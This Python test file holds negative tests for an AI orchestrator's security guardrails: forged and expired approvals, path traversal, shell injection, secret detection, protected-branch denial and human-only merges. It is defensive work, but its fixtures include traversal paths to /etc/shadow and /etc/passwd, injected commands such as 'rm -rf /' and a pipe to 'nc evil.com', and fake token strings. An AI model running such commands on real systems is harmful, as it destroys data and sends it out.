"""Comprehensive negative tests for security guardrails (SEC-005)."""

from datetime import UTC, datetime, timedelta

import pytest

from orchestrator.core.approval import (
    ApprovalExpiredError,
    ApprovalManager,
    ApprovalVerificationError,
)
from orchestrator.core.hooks import (
    HookEngine,
    HookEvent,
    HookExecutionError,
)
from orchestrator.core.policy import HardDenyViolationError, PolicyEngine
from orchestrator.core.sandbox import (
    ShellInjectionError,
    validate_command_argv,
)
from orchestrator.core.worktree import (
    PathSecurityError,
    sanitize_relative_path,
)
from scripts.secret_scan import SECRET_PATTERNS


def test_neg_fake_and_tampered_approval_rejected(tmp_path):
    mgr = ApprovalManager(approvals_dir=tmp_path / "approvals")

    # 1. Non-existent token ID
    with pytest.raises(ApprovalVerificationError, match="not found or forged"):
        mgr.verify_and_consume_token(
            token_id="tok-fake0000000000000000000000000000",
            action="merge_pull_request",
            repository="repo",
            task_id="TASK-001",
            head_sha="0" * 40,
            target_ref="refs/heads/main",
            argv_digest="0" * 64,
            policy_hash="0" * 64,
            plan_hash="0" * 64,
        )

    # 2. Legitimate token with tampered task_id
    token = mgr.issue_token(
        action="merge_pull_request",
        repository="repo",
        task_id="TASK-001",
        head_sha="a" * 40,
        target_ref="refs/heads/main",
        argv_digest="b" * 64,
        policy_hash="c" * 64,
        plan_hash="d" * 64,
        approved_by="human",
        expires_at=(datetime.now(UTC) + timedelta(minutes=5)).isoformat(),
    )

    with pytest.raises(ApprovalVerificationError, match="Token binding mismatch on 'task_id'"):
        mgr.verify_and_consume_token(
            token_id=token["token_id"],
            action="merge_pull_request",
            repository="repo",
            task_id="TASK-MALICIOUS-999",
            head_sha="a" * 40,
            target_ref="refs/heads/main",
            argv_digest="b" * 64,
            policy_hash="c" * 64,
            plan_hash="d" * 64,
        )


def test_neg_expired_and_replayed_approval_rejected(tmp_path):
    mgr = ApprovalManager(approvals_dir=tmp_path / "approvals")

    # Expired token
    token = mgr.issue_token(
        action="release_publish",
        repository="repo",
        task_id="TASK-002",
        head_sha="1" * 40,
        target_ref="refs/heads/main",
        argv_digest="2" * 64,
        policy_hash="3" * 64,
        plan_hash="4" * 64,
        approved_by="human",
        expires_at=(datetime.now(UTC) - timedelta(seconds=1)).isoformat(),
    )

    with pytest.raises(ApprovalExpiredError, match="expired at"):
        mgr.verify_and_consume_token(
            token_id=token["token_id"],
            action="release_publish",
            repository="repo",
            task_id="TASK-002",
            head_sha="1" * 40,
            target_ref="refs/heads/main",
            argv_digest="2" * 64,
            policy_hash="3" * 64,
            plan_hash="4" * 64,
        )


def test_neg_path_traversal_and_injection_rejected():
    # Path traversal patterns
    bad_paths = [
        "../../etc/shadow",
        "../.git/config",
        "/etc/passwd",
        "C:\\Windows\\System32",
        "\\\\attacker-server\\share",
        "orchestrator/\0/malicious",
    ]
    for bp in bad_paths:
        with pytest.raises(PathSecurityError):
            sanitize_relative_path(bp)

    # Shell injection metacharacters
    bad_commands = [
        ["git", "commit", "-m", "foo; rm -rf /"],
        ["pytest", "tests/ | nc evil.com 8080"],
        ["python", "-c", "import os; os.system('echo `id`')"],
        ["ruff", "check", "$(whoami)"],
        ["cat", "file > /dev/null"],
        ["cat", "file < /dev/null"],
    ]
    for bc in bad_commands:
        with pytest.raises(ShellInjectionError):
            validate_command_argv(bc)


def test_neg_secret_fixtures_detected():
    # Construct strings dynamically so they don't trigger the static scanner in commit diff
    fixtures = [
        ("ghp_" + "A" * 36, "GitHub Personal Access Token"),
        ("gho_" + "a" * 36, "GitHub OAuth Access Token"),
        ("github_pat_" + "1" * 22 + "_" + "b" * 59, "GitHub Fine-Grained PAT"),
        ("AKIA" + "0" * 16, "AWS Access Key ID"),
        ("-----BEGIN " + "RSA " + "PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----", "Private Key Block"),
    ]
    for secret_val, expected_name in fixtures:
        matched = False
        for pattern, name in SECRET_PATTERNS:
            if pattern.search(secret_val):
                matched = True
                assert name == expected_name
                break
        assert matched, f"Failed to detect secret fixture for {expected_name}"


def test_neg_hook_failures_and_timeouts_deny():
    engine = HookEngine()

    # Hook throwing exception
    def broken_hook(ctx):
        raise RuntimeError("Hook database connection lost")

    engine.register_hook(HookEvent.BEFORE_PUSH, broken_hook)
    with pytest.raises(HookExecutionError, match="failed with exception"):
        engine.execute_hook(HookEvent.BEFORE_PUSH, {"task_id": "TASK-100"})

    # Hook returning invalid non-PASS
    engine2 = HookEngine()
    engine2.register_hook(HookEvent.BEFORE_COMMIT, lambda ctx: {"status": "FAIL", "reason": "Linter violation"})
    with pytest.raises(HookExecutionError, match="returned non-PASS status: Linter violation"):
        engine2.execute_hook(HookEvent.BEFORE_COMMIT, {"task_id": "TASK-101"})


def test_neg_git_protected_branch_hard_deny():
    policy = PolicyEngine()

    # Direct push to main -> HARD DENY
    with pytest.raises(HardDenyViolationError, match="Direct push to protected branch"):
        policy.evaluate_git_operation("main", "push", is_force=False)

    # Force push to main -> HARD DENY
    with pytest.raises(HardDenyViolationError, match="Direct push to protected branch"):
        policy.evaluate_git_operation("main", "push", is_force=True)

    # Automated PR merge -> HARD DENY
    with pytest.raises(HardDenyViolationError, match="strictly prohibited by Hard Deny"):
        policy.evaluate_action("automated_pr_merge", has_valid_approval=True)


def test_neg_phase_contract_violation_fail_closed(tmp_path):
    """Regression test reproducing Phase Ownership Violation:
    Phase 1 Initial Builder preemptively implementing Phase 3 security remediations must be rejected fail-closed.
    """
    from orchestrator.core.artifacts import ArtifactCollector
    from orchestrator.core.verifier import IndependentVerifier, PhaseContractViolationError

    worktree = tmp_path / "worktree"
    worktree.mkdir()
    app_dir = worktree / "app"
    app_dir.mkdir()
    # Simulates Antigravity in Phase 1 implementing HARDENED logic
    (app_dir / "main.py").write_text(
        "class LabMode(str, Enum):\n"
        "    VULNERABLE = 'VULNERABLE'\n"
        "    HARDENED = 'HARDENED'\n"
        "if mode == LabMode.HARDENED:\n"
        "    response.set_cookie('session', httponly=True, samesite='lax')\n",
        encoding="utf-8",
    )

    collector = ArtifactCollector(allowed_paths=["app/*"])
    artifacts = collector.collect(worktree, tmp_path / "collected")

    phase_contract = {
        "target_phase": 1,
        "prohibits": [
            {
                "id": "PROH-003",
                "statement": "Phase 3 security remediations (LAB-01..06) are strictly prohibited in Phase 1",
                "target_phase": 3,
                "check_type": "forbidden_pattern",
                "patterns": ["HARDENED", "httponly=True", "samesite='lax'"],
                "applies_to": ["app/"],
            }
        ],
    }

    verifier = IndependentVerifier(worktree_dir=worktree)
    with pytest.raises(PhaseContractViolationError, match="prohibited pattern 'HARDENED' detected.*target_phase: 3"):
        verifier.verify_candidate(
            task_id="TASK-WSCL-001",
            base_sha="1" * 40,
            artifacts=artifacts,
            execution_exit_code=0,
            execution_output="All unit tests passed",
            phase_contract=phase_contract,
        )


def test_neg_human_merge_boundary_bot_and_unapproved_fail_closed(tmp_path):
    """Regression test: Automated bots and unapproved merges must fail closed."""
    import json
    from unittest.mock import MagicMock, patch

    from orchestrator.adapters.github import GitHubPRError, RealGitHubStatePublisher
    from orchestrator.core.policy import HardDenyViolationError

    publisher = RealGitHubStatePublisher(
        repo_slug="moruku36/ai-engineering-factory",
        state_dir=tmp_path / "github_state",
    )

    # 1. Automated merge invocation is strictly blocked
    with pytest.raises(HardDenyViolationError, match="Automated merge of PR #10 is strictly prohibited"):
        publisher.attempt_automated_merge(10)

    # 2. Remote merge executed by bot is rejected
    bot_merged_json = json.dumps({
        "number": 10,
        "state": "MERGED",
        "mergedAt": "2026-09-18T12:00:00Z",
        "mergeCommit": {"oid": "a" * 40},
        "headRefOid": "b" * 40,
        "mergedBy": {"login": "github-actions[bot]"},
    })

    def mock_sub(args, **kwargs):
        res = MagicMock()
        res.returncode = 0
        res.stdout = bot_merged_json
        return res

    # 2a. Omitted approval info fails closed (no bypass knobs exist on security path)
    with pytest.raises(GitHubPRError, match="Human approval token is mandatory"):
        publisher.verify_human_merge(10, expected_head_sha="b" * 40, approval_manager=None, approval_token_id=None)

    # 2b. When valid approval provided, automated bot merge is strictly rejected
    mock_approvals = MagicMock()
    mock_approvals.verify_consumed_token_binding.return_value = {"token_id": "tok-valid", "consumed": True}
    with patch("subprocess.run", side_effect=mock_sub), pytest.raises(GitHubPRError, match="merged by automated bot 'github-actions\\[bot\\]'"):
        publisher.verify_human_merge(10, expected_head_sha="b" * 40, approval_manager=mock_approvals, approval_token_id="tok-valid")

